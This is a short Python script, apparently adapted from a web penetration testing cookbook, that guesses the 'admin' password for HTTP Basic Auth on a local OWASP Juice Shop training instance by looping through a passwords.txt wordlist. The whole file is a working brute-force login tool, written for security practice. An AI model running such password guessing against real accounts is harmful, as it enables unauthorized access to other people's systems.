"""
Modified example coming from:
Python Web Penetration Testing Cookbook.pdf
"""

import requests
from requests.auth import HTTPBasicAuth


def main():
    with open('passwords.txt') as passwords:
        for password in passwords.readlines():
            password = password.strip()
            req = requests.get('http://localhost/juice-shop-master/',
                            auth=HTTPBasicAuth('admin', password))
            if req.status_code == 401:
                print(password, 'failed.')
            elif req.status_code == 200:
                print('Login successful, password:', password)
                break
            else:
                print('Error occurred with', password)
                break


if __name__ == "__main__":
    main()